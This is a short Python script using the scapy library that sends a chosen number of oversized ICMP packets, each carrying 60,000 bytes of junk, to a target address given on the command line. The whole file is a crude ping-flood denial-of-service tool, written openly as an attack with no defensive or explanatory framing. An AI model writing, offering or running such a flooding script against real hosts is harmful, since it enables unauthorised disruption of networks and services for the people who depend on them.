from scapy.all import *
import sys

target = sys.argv[1]
total  = int(sys.argv[2])
counter = 0;
while counter < total:
    # Send 60k bytes of junk
    packet = IP(dst=target)/ICMP()/("m"*60000) 
    send(packet)
    counter += 1
